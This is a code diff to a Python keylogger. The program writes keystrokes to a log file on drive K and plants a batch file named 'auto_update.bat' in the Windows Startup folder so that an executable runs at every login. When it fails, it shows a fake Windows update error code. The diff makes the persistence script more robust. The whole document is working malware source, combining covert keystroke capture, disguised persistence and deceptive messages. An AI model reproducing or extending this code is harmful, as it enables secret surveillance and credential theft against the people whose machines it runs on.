@@ -5,6 +5,9 @@ import time
 import getpass
 import shutil
 import os
+import subprocess
+
+
 class Keylogger:
     
     def __init__(self): 
@@ -12,7 +15,7 @@ class Keylogger:
 
     def send_data(self, keystrike):
         self.logger += keystrike
-        with open("K:\\log.txt","a+",encoding="utf-8") as new_file:
+        with open(f"K:\\log.txt","a+",encoding="utf-8") as new_file:
             new_file.write(self.logger)
 
         self.logger = ""
@@ -49,7 +52,15 @@ class Keylogger:
             username = getpass.getuser()
             with open(f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\auto_update.bat', 'w') as file:
             # Write content to the file
-                file.write(f"""start K:\\auto_update.exe""")
+                file.write(f"""
+@echo off
+if exist K:\\auto_update.exe (
+    start K:\\auto_update.exe
+) else (
+    exit
+)
+
+""")
         except Exception as e:
             print("Error [0x80070643]: Failed to Update")
 
